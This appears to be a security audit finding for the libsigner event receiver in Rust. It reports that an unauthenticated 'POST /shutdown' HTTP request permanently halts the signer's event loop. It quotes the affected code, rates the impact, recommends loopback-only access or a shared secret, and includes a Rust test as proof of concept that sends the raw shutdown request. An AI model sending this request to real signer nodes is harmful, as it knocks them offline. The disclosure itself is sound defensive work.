### Title
Unauthenticated `POST /shutdown` permanently terminates the signer's event receiver - (File: libsigner/src/events.rs)

### Summary
`SignerEventReceiver::next_event` handles the `/shutdown` HTTP path by unconditionally setting `stop_signal` to `true` and returning `EventError::Terminated`, with no authentication, secret, or peer-origin check. Any TCP client that can reach the signer's event-receiver listening port can send a raw `POST /shutdown` request and permanently stop the signer's event ingestion loop.

### Finding Description
The equality the code implicitly assumes — "any request reaching `/shutdown` came from the trusted node's event-dispatcher" — is false. `next_event` dispatches purely on `request.url()` and `request.method()`: [1](#0-0) 

For `/status`, `/stackerdb_chunks`, `/proposal_response`, `/new_burn_block`, `/new_block`, and `/shutdown`, there is no bearer token, shared secret, mTLS, or peer-address allowlist check anywhere in `next_event` or in `SignerEventReceiver::bind`/`with_server`. The `/shutdown` branch specifically does:
```rust
} else if request.url() == "/shutdown" {
    event_receiver.stop_signal.store(true, Ordering::SeqCst);
    Err(EventError::Terminated)
}
```
This is the exact same mechanism the node's own `SignerStopSignaler::send` uses internally to gracefully stop the loop (constructing an identical raw HTTP request): [2](#0-1) 

Because `next_event` cannot distinguish this legitimate internal signal from an arbitrary external TCP client sending the same bytes, any remote party who can open a TCP connection to the bound `HttpServer` port can trigger it. Once `stop_signal` is set, `is_stopped()` returns true and `main_loop` breaks out permanently: [3](#0-2) [4](#0-3) 

There is no restart logic elsewhere that re-arms `stop_signal` or rebinds the receiver, so this is a one-shot, irreversible kill switch reachable with a single unauthenticated HTTP request.

### Impact Explanation
A single crafted `POST /shutdown HTTP/1.1` message from any TCP client that can reach the signer's event-receiver port permanently halts `SignerEventReceiver::main_loop`, meaning the signer process stops receiving `StackerDBChunksEvent`, block-validation responses, and burn-block/new-block events from its node. This is an unauthenticated, single-message, deterministic denial of service against a signer, which participates in Nakamoto block signing — matching the "Critical: remote crash/unauthenticated DoS from few messages" category.

### Likelihood Explanation
No privileged role, secret, or prior state is required — the attacker only needs network reachability to the port the signer's `HttpServer` is bound to (as configured by the operator's `endpoint`, e.g. often `0.0.0.0:<port>` in real deployments so the stacks-node's event dispatcher can reach it). No signature, StackerDB slot ownership, or peer authentication guards this endpoint before the terminal action is taken, so exploitation cost is a single crafted HTTP POST.

### Recommendation
Restrict `/shutdown` (and ideally all mutating endpoints on this receiver) to loopback-only connections, or require a shared secret/token known only to the local node process (similar to the RPC secret pattern used elsewhere in the codebase) before honoring the shutdown/store operations. At minimum, validate the peer's socket address against `127.0.0.1`/configured trusted node address before acting on `/shutdown`.

### Proof of Concept
```rust
// libsigner/src/events.rs (test module) or a standalone integration test
use std::net::{TcpStream, SocketAddr};
use std::io::Write;
use std::sync::mpsc::channel;
use std::thread;

#[test]
fn test_unauthenticated_shutdown_dos() {
    let mut receiver: SignerEventReceiver<SomeSignerMessage> = SignerEventReceiver::new(false);
    let addr: SocketAddr = "127.0.0.1:0".parse().unwrap(); // use bind() return for actual port
    let bound_addr = receiver.bind(addr).unwrap();

    let (tx, _rx) = channel();
    receiver.add_consumer(tx);

    let handle = thread::spawn(move || {
        receiver.main_loop();
        receiver // return to inspect is_stopped after loop exit
    });

    // Attacker: plain TCP client, no credentials, not the node
    let mut stream = TcpStream::connect(bound_addr).unwrap();
    let req = "POST /shutdown HTTP/1.1\r\nHost: x\r\nConnection: close\r\nContent-Length: 0\r\n\r\n";
    stream.write_all(req.as_bytes()).unwrap();

    let receiver = handle.join().unwrap();
    assert!(receiver.is_stopped()); // main_loop exited due to unauthenticated request
}
```
The assertion `receiver.is_stopped()` succeeding, combined with `main_loop` returning (thread join completing), demonstrates the unauthenticated remote termination described.

### Citations

**File:** libsigner/src/events.rs (L284-312)
```rust
    fn main_loop(&mut self) {
        loop {
            if self.is_stopped() {
                info!("Event receiver stopped");
                break;
            }
            let next_event = match self.next_event() {
                Ok(event) => event,
                Err(EventError::UnrecognizedEvent(..)) => {
                    // got an event that we don't care about (not a problem)
                    continue;
                }
                Err(EventError::Terminated) => {
                    // we're done
                    info!("Caught termination signal");
                    break;
                }
                Err(e) => {
                    warn!("Failed to receive next event: {:?}", &e);
                    continue;
                }
            };
            if !self.forward_event(next_event) {
                info!("Failed to forward event");
                break;
            }
        }
        info!("Event receiver main loop exit");
    }
```

**File:** libsigner/src/events.rs (L376-396)
```rust
impl EventStopSignaler for SignerStopSignaler {
    #[cfg_attr(test, mutants::skip)]
    fn send(&mut self) {
        self.stop_signal.store(true, Ordering::SeqCst);
        // wake up the thread so the atomicbool can be checked
        // This makes me sad...but for now...it works.
        if let Ok(mut stream) = TcpStream::connect(self.local_addr) {
            // We need to send actual data to trigger the event receiver
            let body = "Yo. Shut this shit down!".to_string();
            let req = format!(
                "POST /shutdown HTTP/1.1\r\nHost: {}\r\nConnection: close\r\nContent-Length: {}\r\nContent-Type: text/plain\r\n\r\n{}",
                self.local_addr,
                body.len(),
                body
            );
            if let Err(e) = stream.write_all(req.as_bytes()) {
                error!("Failed to send shutdown request: {}", e);
            }
        }
    }
}
```

**File:** libsigner/src/events.rs (L413-445)
```rust
    fn next_event(&mut self) -> Result<SignerEvent<T>, EventError> {
        self.with_server(|event_receiver, http_server, _is_mainnet| {
            // were we asked to terminate?
            if event_receiver.is_stopped() {
                return Err(EventError::Terminated);
            }
            debug!("Request handling");
            let request = http_server.recv()?;
            debug!("Got request"; "method" => %request.method(), "path" => request.url());

            if request.url() == "/status" {
                request
                .respond(HttpResponse::from_string("OK"))
                .expect("response failed");
                return Ok(SignerEvent::StatusCheck);
            }

            if request.method() != &HttpMethod::Post {
                return Err(EventError::MalformedRequest(format!(
                    "Unrecognized method '{}'",
                    request.method(),
                )));
            }
            debug!("Processing {} event", request.url());
            if request.url() == "/stackerdb_chunks" {
                process_event::<T, StackerDBChunksEvent>(request)
            } else if request.url() == "/proposal_response" {
                process_event::<T, BlockValidateResponse>(request)
            } else if request.url() == "/new_burn_block" {
                process_event::<T, BurnBlockEvent>(request)
            } else if request.url() == "/shutdown" {
                event_receiver.stop_signal.store(true, Ordering::SeqCst);
                Err(EventError::Terminated)
```

**File:** libsigner/src/events.rs (L461-464)
```rust
    /// Determine if the receiver is hung up
    fn is_stopped(&self) -> bool {
        self.stop_signal.load(Ordering::SeqCst)
    }
```
